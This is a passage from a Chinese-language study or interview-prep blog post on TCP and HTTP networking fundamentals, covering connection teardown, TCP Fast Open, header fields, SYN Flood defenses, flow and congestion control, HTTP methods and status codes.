(报文最大生存时间)，这段时间内如果客户端没有收到服务端的重发请求，那么表示 ACK 成功到达，挥手结束，否则客户端重发 ACK。</p><h3 id="为什么要等待-2MSL-？"><a href="#为什么要等待-2MSL-？" class="headerlink" title="为什么要等待 2MSL ？"></a>为什么要等待 2MSL ？</h3><p>如果不等待，客户端直接跑路，当服务端还有很多数据包要给客户端发，且还在路上的时候，若客户端的端口此时刚好被新的应用占用，就会接收到无用数据包，造成数据包混乱。</p><p>那<strong>为什么要等待 2 MSL?</strong></p><p>1 个 MSL 确保四次挥手中主动关闭方最后的 ACK 报文最终能达到对端<br>1 个 MSL 确保对端没有收到 ACK 重传的 FIN 报文可以到达</p><h3 id="为什么是四次挥手而不是三次？"><a href="#为什么是四次挥手而不是三次？" class="headerlink" title="为什么是四次挥手而不是三次？"></a>为什么是四次挥手而不是三次？</h3><p>因为服务端在接收到 FIN 后往往不会立即返回 FIN，必须等到服务端所有的报文都发送完毕了才能发FIN。<br>因此先发一个ACK表示已经收到客户端的FIN，延迟一段时间才发FIN。这就造成了四次挥手。</p><p><strong>如果是三次挥手会有什么问题？</strong></p><p>等于说服务端将 ACK 和 FIN 的发送合并为一次挥手，长时间的延迟可能会导致客户端误以为 FIN 没有到达客户端，从而让客户端不断的重发 FIN。</p><h3 id="同时关闭会怎么样？"><a href="#同时关闭会怎么样？" class="headerlink" title="同时关闭会怎么样？"></a>同时关闭会怎么样？</h3><p><img src="https://i.loli.net/2021/10/14/9s6tlXAQGv1y478.png" alt="image.png"></p><h2 id="简述一下-TCP-快速打开（TFO）"><a href="#简述一下-TCP-快速打开（TFO）" class="headerlink" title="简述一下 TCP 快速打开（TFO）"></a>简述一下 TCP 快速打开（TFO）</h2><h3 id="TFO的流程知道吗？"><a href="#TFO的流程知道吗？" class="headerlink" title="TFO的流程知道吗？"></a>TFO的流程知道吗？</h3><p><img src="https://i.loli.net/2021/10/14/4LIMynj6d2lzoqs.png" alt="image.png"></p><p><strong>首轮三次握手</strong></p><ul><li>首先客户端发送SYN给服务端，服务端接收到。</li><li>注意哦！现在服务端不是立刻回复 SYN + ACK，而是通过计算得到一个SYN Cookie， 将这个Cookie放到 TCP 报文的 Fast Open选项中，然后才给客户端返回。</li><li>客户端拿到这个 Cookie 的值缓存下来。</li></ul><p><strong>后面的三次握手</strong></p><ul><li>首先客户端会将之前缓存的 Cookie、SYN 和 <strong>HTTP 请求</strong>发送给服务端，服务端验证 Cookie 的合法性，如果不合法直接丢弃；如果合法就正常返回 SYN + ACK。</li><li><strong>现在服务端能向客户端发 HTTP 响应了！</strong>三次握手还没建立，仅仅验证了 Cookie 的合法性，就可以返回 HTTP 响应。</li><li>最后，客户端传 ACK。（客户端最后握手的 ACK 不一定要等到服务端的 HTTP 响应到达才发送，两个过程没有任何关系。）</li></ul><h3 id="TFO-有什么优势"><a href="#TFO-有什么优势" class="headerlink" title="TFO 有什么优势?"></a>TFO 有什么优势?</h3><p>TFO 的优势在于后面的握手，在拿到客户端的 Cookie 并验证通过以后，可以直接返回 HTTP 响应，充分利用了1 个RTT(Round-Trip Time，往返时延)的时间提前进行数据传输。</p><h2 id="剖析-TCP-报文首部字段"><a href="#剖析-TCP-报文首部字段" class="headerlink" title="剖析 TCP 报文首部字段"></a>剖析 TCP 报文首部字段</h2><p><img src="https://i.loli.net/2021/10/14/OEvglSPaxyCGRh6.png" alt="image.png"></p><ol><li><strong>源端口、目标端口：</strong>如何标识唯一标识一个连接？TCP  连接的四元组————源 IP、源端口、目标 IP 和目标端口。TCP  报文在 IP 层就已经处理了 IP ，因此只需要记录两者的端口。</li><li><strong>序列号：</strong>指的是本报文段第一个字节的序列号。在 TCP 通信的过程中有两个作用:<ul><li>在 SYN 报文中交换彼此的初始序列号。</li><li>保证数据包按正确的顺序组装。</li></ul></li><li><strong>ISN：</strong>Initial Sequence Number（初始序列号），在三次握手的过程当中，双方会用过SYN报文来交换彼此的 ISN。ISN 并不是一个固定的值，而是每 4 ms 加一，溢出则回到 0。<strong>为什么要这么做？</strong><ul><li>当攻击者猜测 ISN 并直接伪造一个 RST 后，就可以强制连接关闭，这是非常危险的。而动态增长的 ISN 大大提高了猜测 ISN 的难度。</li></ul></li><li><strong>确认号：</strong>ACK(Acknowledgment number)。用来告知对方下一个期望接收的序列号，小于ACK的所有字节已经全部收到。</li><li><strong>标记位：</strong>常见的标记位有SYN，ACK，FIN，RST，PSH。<ul><li><strong>FIN：</strong> 即 Finish，表示发送方准备断开连接。</li><li><strong>RST：</strong>即 Reset，用来强制断开连接</li><li><strong>PSH：</strong>即 Push， 告知对方这些数据包收到后应该马上交给上层的应用，不能缓存。</li></ul></li><li><strong>窗口大小：</strong>占用两个字节（16 位）实际上是不够用的。因此 TCP 引入了窗口缩放的选项，作为窗口缩放的比例因子，这个比例因子的范围在 0 ~ 14，比例因子可以将窗口的值扩大为原来的 2 ^ n 次方。</li><li><strong>校验和：</strong>占用两个字节，防止传输过程中数据包有损坏，如果遇到校验和有差错的报文，TCP  直接丢弃并等待重传。</li><li><strong>可选项：</strong>常用的可选项有以下几个:<ul><li>TimeStamp:  TCP 时间戳。</li><li>MSS: 指的是 TCP 允许的从对方接收的最大报文段。</li><li>SACK: 选择确认选项。</li><li>Window Scale：窗口缩放选项。</li></ul></li></ol><h2 id="TCP-时间戳的作用"><a href="#TCP-时间戳的作用" class="headerlink" title="TCP 时间戳的作用"></a>TCP 时间戳的作用</h2><h3 id="计算往返时延RTT"><a href="#计算往返时延RTT" class="headerlink" title="计算往返时延RTT"></a>计算往返时延RTT</h3><p><img src="https://i.loli.net/2021/10/14/T1RKAeQGjiIqL98.png" alt="image.png"></p><ul><li><p>如果以第一次发包为开始时间的话，就会导致 RTT 明显偏大，开始时间应该采用第二次的；</p></li><li><p>如果以第二次发包为开始时间的话，就会导致 RTT 明显偏小，开始时间应该采用第一次的。</p></li></ul><p>这个时候引入时间戳就很好的解决了这个问题：比如现在 a 向 b 发送一个报文 s1，b 向 a 回复一个含 ACK 的报文 s2 。</p><ul><li>a 向 b 发送的时候，timestamp 中存放的内容就是 a 主机发送时的时刻 ta1。</li><li>b 向 a 回复 s2 报文的时候，timestamp 中存放的是 b 主机的时刻 tb， timestamp echo字段为从 s1 报文中解析出来的 ta1。</li><li>a 收到 b 的 s2 报文之后，此时 a 主机的内核时刻是 ta2， 而在 s2 报文中的 timestamp echo 选项中可以得到 ta1， 也就是 s2 对应的报文最初的发送时刻。然后直接采用 ta2 - ta1 就得到了 RTT 的值。</li></ul><h3 id="防止序列号回绕的问题"><a href="#防止序列号回绕的问题" class="headerlink" title="防止序列号回绕的问题"></a>防止序列号回绕的问题</h3><p>用 timestamp 能很好地解决两个数据包序列号相同的问题，因为每次发包的时候都是将发包机器当时的内核时间记录在报文中，即使两次发包序列号相同，时间戳也不可能相同，这样就能区分两个数据包。</p><h2 id="TCP-超时重传算法"><a href="#TCP-超时重传算法" class="headerlink" title="TCP 超时重传算法"></a>TCP 超时重传算法</h2><p><strong>经典方法：</strong>引入了一个新的概念——SRTT(Smoothed round trip time，即平滑往返时间)，每产生一次新的 RTT，就根据一定的算法对 SRTT 进行更新。</p><p><strong>标准方法：</strong>为了解决经典方法对于 RTT 变化不敏感的问题，后面又引出了标准方法。在 SRTT 的基础上加上了最新 RTT 与它的偏移，从而很好的感知 RTT 的变化。</p><h2 id="半连接队列和-SYN-Flood-攻击原理"><a href="#半连接队列和-SYN-Flood-攻击原理" class="headerlink" title="半连接队列和 SYN Flood 攻击原理"></a>半连接队列和 SYN Flood 攻击原理</h2><p>1、三次握手前，服务端的状态从CLOSED变为LISTEN， 同时在内部创建了两个队列：半连接队列和全连接队列，即SYN队列和ACCEPT队列。<br>2、半连接队列是当客户端发送SYN到服务端，服务端收到以后回复ACK和SYN，状态由LISTEN变为SYN_RCVD，此时这个连接就被推入了SYN队列<br>3、SYN Flood 在短时间内伪造大量不存在的 IP地址，并向服务端疯狂发送SYN。服务端处理大量的SYN包并返回对应ACK， 势必有大量连接处于SYN_RCVD状态，从而占满整个半连接队列，无法处理正常的请求。同时，由于是不存在的 IP，服务端长时间收不到客户端的ACK，会导致服务端不断重发数据，直到耗尽服务端的资源。</p><h3 id="全连接队列"><a href="#全连接队列" class="headerlink" title="全连接队列"></a>全连接队列</h3><p>当客户端返回 ACK，服务端接收后，三次握手完成。这个时候连接等待被具体的应用取走，在被取走之前，它会被推入另外一个 TCP 维护的队列，即全连接队列。</p><h3 id="如何应对-SYN-Flood-攻击？"><a href="#如何应对-SYN-Flood-攻击？" class="headerlink" title="如何应对 SYN Flood 攻击？"></a>如何应对 SYN Flood 攻击？</h3><p>1、增加 SYN 连接，也就是增加半连接队列的容量。</p><p>2、减少 SYN + ACK 重试次数，避免大量的超时重发。</p><p>3、利用 SYN Cookie技术，在服务端接收到SYN后不立即分配连接资源，而是根据这个SYN计算出一个Cookie，连同第二次握手回复给客户端，在客户端回复ACK的时候带上这个Cookie值，服务端验证Cookie 合法之后才分配连接资源。</p><h2 id="说一说-TCP-的流量控制"><a href="#说一说-TCP-的流量控制" class="headerlink" title="说一说 TCP 的流量控制"></a>说一说 TCP 的流量控制</h2><h3 id="TCP-流量控制是干什么的？"><a href="#TCP-流量控制是干什么的？" class="headerlink" title="TCP 流量控制是干什么的？"></a>TCP 流量控制是干什么的？</h3><p>对于发送端和接收端而言，TCP 需要把发送的数据放到发送缓存区，将接收的数据放到接收缓存区。</p><p>流量控制要做的事情，就是在通过接收缓存区的大小，控制发送端的发送。如果对方的接收缓存区满了，就不能再继续发送了。</p><h3 id="TCP-滑动窗口概念"><a href="#TCP-滑动窗口概念" class="headerlink" title="TCP 滑动窗口概念"></a>TCP 滑动窗口概念</h3><p><strong>发送窗口：</strong></p><p><img src="https://i.loli.net/2021/10/14/qFzVp16354Y8s2l.png" alt="image.png"></p><p>包含四大部分:</p><ul><li>已发送且已确认</li><li>已发送但未确认</li><li>未发送但可以发送</li><li>未发送也不可以发送</li></ul><p>发送窗口就是图中被框住的范围。SND 即 send， WND 即 window， UNA 即 unacknowledged， 表示未被确认，NXT 即next， 表示下一个发送的位置。</p><p><strong>接收窗口：</strong></p><p><img src="https://i.loli.net/2021/10/14/7tErVjUL8bvqI4z.png" alt="image.png"></p><p>REV 即 receive，NXT 表示下一个接收的位置，WND 表示接收窗口大小。</p><h3 id="流量控制过程"><a href="#流量控制过程" class="headerlink" title="流量控制过程"></a>流量控制过程</h3><p>举个例子：</p><ol><li><p>首先双方三次握手，初始化各自的窗口大小，均为 200 个字节。</p></li><li><p>假如当前发送端给接收端发送 100 个字节，那么此时对于发送端而言，SND.NXT 当然要右移 100 个字节，也就是说当前的可用窗口减少了 100 个字节。</p></li><li><p>现在这 100 个到达了接收端，被放到接收端的缓冲队列中。不过此时由于大量负载的原因，接收端处理不了这么多字节，只能处理 40 个字节，剩下的 60 个字节被留在了缓冲队列中。</p></li><li><p>注意，此时接收端的情况是处理能力不够用，所以此时接收端的接收窗口应该缩小 60 个字节，由 200 个字节变成了 140 字节，因为缓冲队列还有 60 个字节没被应用拿走。</p></li><li><p>因此，接收端会在 ACK 的报文首部带上缩小后的滑动窗口 140 字节，发送端对应地调整发送窗口的大小为 140 个字节。</p></li><li><p>此时对于发送端而言，已经发送且确认的部分增加 40 字节，也就是 SND.UNA 右移 40 个字节，同时发送窗口缩小为 140 个字节。</p></li></ol><h2 id="说说-TCP-的拥塞控制（高频）"><a href="#说说-TCP-的拥塞控制（高频）" class="headerlink" title="说说 TCP 的拥塞控制（高频）"></a>说说 TCP 的拥塞控制（高频）</h2><h3 id="拥塞控制主要处理的问题？"><a href="#拥塞控制主要处理的问题？" class="headerlink" title="拥塞控制主要处理的问题？"></a>拥塞控制主要处理的问题？</h3><p>流量控制发生在发送端跟接收端之间，并没有考虑到整个网络环境的影响。</p><p>而 TCP 的拥塞控制主要处理的问题是<strong>整个网络环境网络特别差，特别容易丢包的情况</strong>。</p><h3 id="拥塞窗口"><a href="#拥塞窗口" class="headerlink" title="拥塞窗口"></a>拥塞窗口</h3><p>拥塞窗口（cwnd）是指目前自己还能传输的数据量大小。</p><h3 id="接收窗口与拥塞窗口的区别？"><a href="#接收窗口与拥塞窗口的区别？" class="headerlink" title="接收窗口与拥塞窗口的区别？"></a>接收窗口与拥塞窗口的区别？</h3><ul><li>接收窗口(rwnd)是接收端给的限制</li><li>拥塞窗口(cwnd)是发送端的限制，限制的是发送窗口的大小。发送窗口大小 = min(rwnd， cwnd)</li></ul><h3 id="慢启动"><a href="#慢启动" class="headerlink" title="慢启动"></a>慢启动</h3><p>采用一种保守的算法来慢慢地适应整个网路，这种算法叫慢启动。过程：</p><ol><li>首先三次握手，双方宣告自己的接收窗口大小</li><li>双方初始化自己的拥塞窗口(cwnd)大小</li><li>在开始传输的一段时间，发送端每收到一个 ACK，拥塞窗口大小加 1，即每经过一个 RTT，拥塞窗口翻倍，直到达到慢启动阈值。</li></ol><h3 id="拥塞避免"><a href="#拥塞避免" class="headerlink" title="拥塞避免"></a>拥塞避免</h3><p>达到阈值后，如何来控制拥塞窗口的大小：</p><p>原来每收到一个 ACK，拥塞窗口加1，现在到达阈值拥塞窗口只能加: 1/拥塞窗口。以前一轮 RTT 下来，cwnd 翻倍，现在 cwnd 只是增加 1 而已。</p><h3 id="快速重传和快速恢复"><a href="#快速重传和快速恢复" class="headerlink" title="快速重传和快速恢复"></a>快速重传和快速恢复</h3><p>快速重传解决的是<strong>是否需要重传的问题</strong>：在 TCP 传输的过程中，如果发生了丢包，即接收端发现数据段不是按序到达的时候，接收端的处理是重复发送之前的 ACK。比如第5个包丢了，即使第6、7个包到达的接收端，接收端也一律返回第4个包的ACK。收到 3 个重复的 ACK ，意识到丢包，马上重传。</p><p><strong>选择性重传</strong></p><p>在收到发送端的报文后，接收端回复一个 ACK 报文，那么在这个报文首部的可选项中，就可以加上SACK这个属性，通过left edge和right edge告知发送端已经收到了哪些区间的数据报。因此，即使第 5 个包丢包了，当收到第 6、7 个包之后，接收端依然会告诉发送端，这两个包到了。剩下第 5 个包没到，就重传这个包。这个过程也叫做选择性重传(SACK，Selective Acknowledgment)，它解决的是<strong>如何重传的问题</strong>。</p><p><strong>快速恢复</strong></p><p>发送端收到三次重复ACK之后，发现丢包觉得现网络已经有些拥塞了，会进入快速恢复阶段，发送端如下改变：</p><ul><li>拥塞阈值降低为 cwnd 的一半</li><li>cwnd 的大小变为拥塞阈值</li><li>cwnd 线性增加</li></ul><h2 id="说说-Nagle-算法和延迟确认"><a href="#说说-Nagle-算法和延迟确认" class="headerlink" title="说说 Nagle 算法和延迟确认"></a>说说 Nagle 算法和延迟确认</h2><h3 id="Nagle-算法"><a href="#Nagle-算法" class="headerlink" title="Nagle 算法"></a>Nagle 算法</h3><p>试想一个场景，发送端不停地给接收端发很小的包，一次只发 1 个字节，那么发 1 千个字节需要发 1000 次。这种频繁的发送是存在问题的，不光是传输的时延消耗，发送和确认本身也是需要耗时的，频繁的发送接收带来了巨大的时延。而<strong>避免小包的频繁发送</strong>，这就是 Nagle 算法要做的事情。</p><p>Nagle 算法的规则如下:</p><ol><li>当第一次发送数据时不用等待，就算是 1byte 的小包也立即发送</li><li>后面发送满足下面条件之一就可以发了:<ul><li>数据包大小达到最大段大小(Max Segment Size， 即 MSS)</li><li>之前所有包的 ACK 都已接收到</li></ul></li></ol><h3 id="延迟确认"><a href="#延迟确认" class="headerlink" title="延迟确认"></a>延迟确认</h3><p>试想这样一个场景，当收到了发送端的一个包，然后在极短的时间内又接收到了第二个包，那接收方是一个个地回复，还是稍微等一下，把两个包的 ACK 合并后一起回复呢？</p><p>延迟确认(delayed ack)所做的事情，就是<strong>稍稍延迟然后合并 ACK，最后才回复给发送端</strong>。TCP 要求这个延迟的时延必须小于500ms，一般操作系统实现都不会超过200ms。</p><p>不过需要注意的是，有一些场景是不能延迟确认的，收到了就要马上回复:</p><ol><li>接收到了大于一个 frame 的报文，且需要调整窗口大小</li><li> TCP  处于 quickack 模式（通过 TCP _in_quickack_mode设置）</li><li>发现了乱序包</li></ol><h3 id="两者一起使用会怎样？"><a href="#两者一起使用会怎样？" class="headerlink" title="两者一起使用会怎样？"></a>两者一起使用会怎样？</h3><p>前者意味着延迟发，后者意味着延迟接收，会造成更大的延迟，产生性能问题。</p><h2 id="如何理解-TCP-的-keep-alive"><a href="#如何理解-TCP-的-keep-alive" class="headerlink" title="如何理解 TCP 的 keep-alive"></a>如何理解 TCP 的 keep-alive</h2><p>与 http 的 keep-alive 不太一样。</p><p>试想一个场景，当有一方因为网络故障或者宕机导致连接失效，由于 TCP 并不是一个轮询的协议，在下一个数据包到达之前，对端的连接失效的情况是一无所知的。</p><p>这个时候就出现了 keep-alive， 它的作用就是<strong>探测对端的连接有没有失效</strong>。</p><h1 id="应用层—HTTP、HTTPS、DNS"><a href="#应用层—HTTP、HTTPS、DNS" class="headerlink" title="应用层—HTTP、HTTPS、DNS"></a>应用层—HTTP、HTTPS、DNS</h1><p><img src="https://i.loli.net/2021/10/14/39p8hldRn5cSNEz.png" alt="image.png"></p><h2 id="HTTP-1-0？（高频）"><a href="#HTTP-1-0？（高频）" class="headerlink" title="HTTP 1.0？（高频）"></a>HTTP 1.0？（高频）</h2><p>超文本传输协议 HTTP（HyperText Transfer Protocol）是一个在客户端和服务器之间传输文字、图片、音频、视频等超文本数据的约定和规范。<strong>默认使用 80 端口</strong>，<strong>它使用 TCP 作为传输层协议，保证了数据传输的可靠性。</strong></p><h3 id="HTTP-特点"><a href="#HTTP-特点" class="headerlink" title="HTTP 特点"></a>HTTP 特点</h3><p>HTTP 协议是一种端对端的协议，也是一种请求/响应模式的协议。</p><ol><li><strong>灵活可扩展</strong>。<ul><li>语义上的自由，只规定了基本格式，比如空格分隔单词、换行分隔字段，其他的各个部分都没有严格的语法限制。</li><li>传输形式的多样性，不仅仅可以传输文本，还能传输图片、视频等任意数据，非常方便。</li></ul></li><li><strong>可靠传输</strong>。HTTP 基于 TCP/IP。</li><li><strong>请求-应答</strong>。即一发一收、有来有回。</li><li><strong>无状态</strong>。这里的状态是指通信过程的上下文信息，每次 http 请求都是独立无关的，默认不需要保留状态信息。</li><li><strong>持久连接</strong>。HTTP1.1 以后默认采用的是持久连接，TCP 连接默认不关闭，可以被多个请求复用。目前对于同一个域，大多数浏览器支持同时建立 6 个持久连接。</li></ol><h3 id="HTTP缺点"><a href="#HTTP缺点" class="headerlink" title="HTTP缺点"></a>HTTP缺点</h3><ol><li><strong>明文传输</strong>：即协议里的报文（主要指头部）不使用二进制数据，而是文本形式。这让 HTTP 的报文信息暴露给了外界，给攻击者也提供了便利。</li><li><strong>无状态</strong>：在需要长连接的场景中，需要保存大量的上下文信息，以免传输大量重复信息，那么这时候无状态就是 http 的缺点了。<strong>但与此同时</strong>，另外一些应用仅仅只是为了获取一些数据，不需要保存连接上下文信息，无状态反而减少了网络开销，成为了 http 的优点。</li><li><strong>队头阻塞</strong>：当 http 开启长连接时，共用一个 TCP 连接，同一时刻只能处理一个请求，那么当前请求耗时过长的情况下，其它的请求只能处于阻塞状态，也就是著名的队头阻塞问题。</li></ol><h3 id="HTTP1-1-优点"><a href="#HTTP1-1-优点" class="headerlink" title="HTTP1.1 优点"></a>HTTP1.1 优点</h3><ol><li><strong>简单：</strong>HTTP 基本的报文格式就是 header + body ，头部信息也是 key-value 简单文本的形式，易于理解。</li><li><strong>灵活和易于扩展：</strong>HTTP协议里的各类请求方法、URI/URL、状态码、头字段等每个组成要求都允许开发人员自定义和扩充。同时 HTTP 由于是工作在应用层（ OSI 第七层），它下层可以随意变化（HTTPS 也就是在 HTTP 与 TCP 层之间增加了 SSL/TLS 安全传输层，HTTP/3 甚至把 TCP 层换成了基于 UDP 的 QUIC）</li><li><strong>应用广泛和跨平台：</strong>互联网发展至今，HTTP 的应用范围非常的广泛，同时天然具有跨平台的优越性。</li></ol><h2 id="HTTP-1-0和-HTTP-1-1-之间有哪些区别？（1-1高频）"><a href="#HTTP-1-0和-HTTP-1-1-之间有哪些区别？（1-1高频）" class="headerlink" title="HTTP 1.0和 HTTP 1.1 之间有哪些区别？（1.1高频）"></a>HTTP 1.0和 HTTP 1.1 之间有哪些区别？（1.1高频）</h2><ol><li><strong>连接方面</strong>：http1.1 默认使用持久连接，而 http1.0 默认使用非持久连接。http1.1 通过使用持久连接来使多个 http 请求复用同一个 TCP 连接，以此来避免使用非持久连接时每次需要建立连接的时延。</li><li><strong>资源请求方面</strong>：在 http1.0 中，存在一些浪费带宽的现象，例如客户端只是需要某个对象的一部分，而服务器却将整个对象送过来了，并且不支持断点续传功能，http1.1 则在请求头引入了 range 头域，它允许只请求资源的某个部分，即返回码是 206，这样就方便了开发者自由的选择以便于充分利用带宽和连接。</li><li><strong>缓存方面：</strong>在 http1.0 中主要使用 header 里的 If-Modified-Since，Expires 来做为缓存判断的标准，http1.1 则引入了更多的缓存控制策略例如 Etag、If-Unmodified-Since、If-Match、If-None-Match 等更多可供选择的缓存头来控制缓存策略。</li><li>http1.1 中还新增 host 字段，用来<strong>指定服务器的域名</strong>（将请求发往同一台服务器上的不同网站）。http1.0 中认为每台服务器都绑定一个唯一的 IP 地址，因此，请求消息中的 URL 并没有传递主机名。</li></ol><p>http1.1 相对于 http1.0 还<strong>新增很多请求方法</strong>，如 PUT、HEAD、OPTIONS 等。</p><h2 id="说说-HTTP-请求报文？（结构）"><a href="#说说-HTTP-请求报文？（结构）" class="headerlink" title="说说 HTTP 请求报文？（结构）"></a>说说 HTTP 请求报文？（结构）</h2><p><img src="https://i.loli.net/2021/10/14/n2Da1JU46iLubyG.png" alt="image.png"></p><p>HTTP 请求报文（响应报文）的第一行叫做请求行（响应行），后面跟的首部字段，首部后还可以跟一个实体主体。请求首部之后有一个空行（不能省略），用来划分首部与实体。</p><p>请求行字段：方法字段、URL 字段和 HTTP 版本字段。</p><h3 id="HTTP-Request-Header-常见的请求头："><a href="#HTTP-Request-Header-常见的请求头：" class="headerlink" title="HTTP Request Header 常见的请求头："></a>HTTP Request Header 常见的请求头：</h3><ul><li>Accept：浏览器能够处理的内容类型</li><li>Accept-Charset：浏览器能够显示的字符集</li><li>Accept-Encoding：浏览器能够处理的压缩编码</li><li>Accept-Language：浏览器当前设置的语言</li><li>Connection：浏览器与服务器之间连接的类型</li><li>Cookie：当前页面设置的任何Cookie</li><li>Host：发出请求的页面所在的域</li><li>Referer：发出请求的页面的URL</li><li>User-Agent：浏览器的用户代理字符串</li></ul><h3 id="HTTP-Responses-Header-常见的响应头："><a href="#HTTP-Responses-Header-常见的响应头：" class="headerlink" title="HTTP Responses Header 常见的响应头："></a>HTTP Responses Header 常见的响应头：</h3><ul><li>Date：表示消息发送的时间</li><li>server：服务器名字</li><li>Connection：浏览器与服务器之间连接的类型</li><li>Cache-Control：控制HTTP缓存</li><li>Content-type：表示后面的文档属于什么类型。</li></ul><h2 id="请求方法你知道哪些？"><a href="#请求方法你知道哪些？" class="headerlink" title="请求方法你知道哪些？"></a>请求方法你知道哪些？</h2><p>HTTP1.0 定义了三种请求方法：<strong>GET</strong>，<strong>POST</strong> 和 <strong>HEAD</strong>方法</p><p>HTTP1.1 新增了五种请求方法：OPTIONS，<strong>PUT</strong>，<strong>DELETE</strong>，TRACE 和 CONNECT</p><ul><li>GET：通常用来获取资源</li><li>HEAD：获取资源的元信息（报文首部）</li><li>POST：提交数据，即上传数据</li><li>PUT：修改数据</li><li>DELETE：删除资源(几乎用不到)</li><li>CONNECT：建立连接隧道，用于代理服务器</li><li>OPTIONS：列出可对资源实行的请求方法，用来跨域请求</li><li>TRACE：追踪请求-响应的传输路径</li></ul><h3 id="其中-GET-、POST-区别？（高频）"><a href="#其中-GET-、POST-区别？（高频）" class="headerlink" title="其中 GET 、POST 区别？（高频）"></a>其中 GET 、POST 区别？（高频）</h3><p>语义上的区别，GET 用于获取资源，POST 用于提交资源。</p><p>（1）<strong>应用场景</strong>：</p><ul><li>GET 请求是一个幂等的请求，一般用于对服务器资源不会产生影响的场景，比如说请求一个网页、搜索关键字。</li><li>POST 不是一个幂等的请求，一般用于对服务器资源会产生影响的情景，比如注册用户。</li></ul><p>（2）<strong>缓存</strong>：浏览器一般会对 GET 请求缓存，但很少对 POST 请求缓存。</p><p>（3）<strong>发送的报文格式</strong>：GET 请求的报文中实体部分为空，POST 请求的报文中实体部分一般为向服务器发送的数据。</p><p>（4）<strong>参数</strong>：GET一般放在URL上传递参数，不安全，因为请求的 url 会被保留在历史记录中，且由于浏览器对 url 长度的限制，会影响 GET 请求发送数据时的长度；POST放在请求体里，更适合传递敏感信息，且参数传递支持更多的数据类型。</p><p>（5）<strong>编码</strong>：GET 只能进行 URL 编码，只接收 ASCII 字符，而 POST 没有限制。</p><p>（6）<strong>TCP</strong>：GET 请求会把请求报文一次性发出去，而 POST 会分为两个 TCP 数据包，首先发 header 部分，如果服务器响应 100(continue)， 再发 body 部分。</p><h2 id="get-请求传参长度的误区"><a href="#get-请求传参长度的误区" class="headerlink" title="get 请求传参长度的误区"></a>get 请求传参长度的误区</h2><p>误区：我们经常说 get 请求参数的大小存在限制，而 post 请求的参数大小是无限制的。</p><p>实际上 HTTP 协议从未规定 GET/POST 的请求长度限制是多少。对 get 请求参数的限制是来源于浏览器或 web 服务器，浏览器或 web 服务器限制了 url 的长度。为了明确这个概念，我们必须再次强调下面几点:</p><ul><li>HTTP 协议未规定 GET 和 POST 的长度限制</li><li>GET 的最大长度显示是因为浏览器和 web 服务器限制了 URI 的长度</li><li>不同的浏览器和 WEB 服务器，限制的最大长度不一样</li><li>要支持 IE，则最大长度为 2083byte，若只支持 Chrome，则最大长度 8182byte</li></ul><h3 id="POST、PUT-区别"><a href="#POST、PUT-区别" class="headerlink" title="POST、PUT 区别"></a>POST、PUT 区别</h3><p>PUT 请求是向服务器端发送数据，从而<strong>修改数据的内容</strong>，但是不会增加数据的种类。即无论进行多少次PUT操作，其结果并没有不同。（更新数据）</p><p>POST 请求是向服务器端发送数据的，该请求会<strong>改变数据的种类</strong>等资源，创建新的内容。（创建数据）</p><h3 id="OPTIONS-方法有什么用？（高频）"><a href="#OPTIONS-方法有什么用？（高频）" class="headerlink" title="OPTIONS 方法有什么用？（高频）"></a>OPTIONS 方法有什么用？（高频）</h3><p>OPTIONS 请求与 HEAD 类似，一般用于客户端查看服务器的性能。</p><p>这个方法会请求服务器返回该资源所支持的所有 HTTP 请求方法。该方法会用’*’来代替资源名称，向服务器发送 OPTIONS 请求，以确定针对某个目标地址的请求必须具有怎么样的约束，然后根据约束发送真正的请求。</p><p><strong>举个例子？</strong></p><ul><li>针对跨域资源的预检，就是采用 HTTP 的 OPTIONS 方法先发送的，用来处理跨域请求。</li><li>获取服务器支持的所有 HTTP 请求方法；</li><li>用来检查访问权限。JS 的 XMLHttpRequest 对象进行 CORS 跨域资源共享时，对于复杂请求就是使用 OPTIONS 方法发送嗅探请求，以判断是否有对指定资源的访问权限。</li></ul><h2 id="对URI的理解？"><a href="#对URI的理解？" class="headerlink" title="对URI的理解？"></a>对URI的理解？</h2><p><a href="https://i.loli.net/2021/10/14/85ZmJC6ibsNBDkO.png">https://i.loli.net/2021/10/14/85ZmJC6ibsNBDkO.png</a></p><p>URI（Uniform Resource Identifier），也就是统一资源标识符，作用是<strong>区分互联网上不同的资源</strong>。URI 包含了 URN 和 URL 两个部分，由于 URL 过于普及，就默认将 URI 视为 URL 了。</p><ul><li>scheme 表示协议名，比如 http， https， file 等等。后面必须和 :// 连在一起。</li><li>user:passwd@ 表示登录主机时的用户信息，不过很不安全，不推荐使用。</li><li>host:port 表示主机名和端口。</li><li>path 表示请求路径，标记资源所在位置。</li><li>query 表示查询参数，为 key=val 这种形式，多个键值对之间用&amp;隔开。</li><li>fragment 表示 URI 所定位的资源内的一个锚点，浏览器可以根据这个锚点跳转到对应的位置。</li></ul><p><strong>URL 编码</strong></p><ul><li>URL 只能使用 ASCII 字符集来通过因特网进行发送。</li><li>由于 URL 常常会包含 ASCII 集合之外的字符，URL 必须转换为有效的 ASCII 格式。</li><li>URL 编码使用 “%” 其后跟随两位的十六进制数来替换非 ASCII 字符。</li><li>URL 不能包含空格。URL 编码通常使用 + 来替换空格。</li></ul><h2 id="HTTP状态码有哪些？（高频）"><a href="#HTTP状态码有哪些？（高频）" class="headerlink" title="HTTP状态码有哪些？（高频）"></a>HTTP状态码有哪些？（高频）</h2><p>参考自<a href="https://juejin.cn/post/6908327746473033741">https://juejin.cn/post/6908327746473033741</a></p><ul><li>1xx(<strong>信息性</strong>状态码)：接受的请求正在处理。<ul><li>101 Switching Protocols 在 HTTP 升级为 WebSocket 的时候，如果服务器同意变更，就会发送状态码 101。</li></ul></li><li>2xx(<strong>成功</strong>状态码)：请求正常处理完毕。<ul><li>200 OK：最多的成功状态码，通常在响应体中放有数据。</li><li>204 No Content：含义与 200 相同，但响应头后没有 body 数据。</li><li>206 Partial Content：表示部分内容，响应报文中包含由 Content-Range 指定范围的实体内容。使用场景为 HTTP 分块下载和断点续传。</li></ul></li><li>3xx(<strong>重定向</strong>状态码)： 资源位置发生变动，需要重新请求。<ul><li>301 Moved Permanently：<strong>永久重定向</strong>，表示请求的资源已经被分配了新的 URI，以后应使用资源指定的 URI。新的 URI 会在 HTTP 响应头中的 Location 首部字段指定。</li><li>302 Found：<strong>临时重定向</strong>，这个资源只是暂时不能被访问了，但是之后过一段时间还是可以继续访问。使用场景：<ul><li>未登陆的用户访问用户中心重定向到登录页面。</li><li>访问404页面重新定向到首页。</li></ul></li><li>304 Not Modefied：<strong>浏览器缓存相关。</strong>当协商缓存命中时会返回这个状态码，返回页面的只有头部信息，不包含任何响应的主体部分，在一定程度上提高了网页的性能。</li><li>307 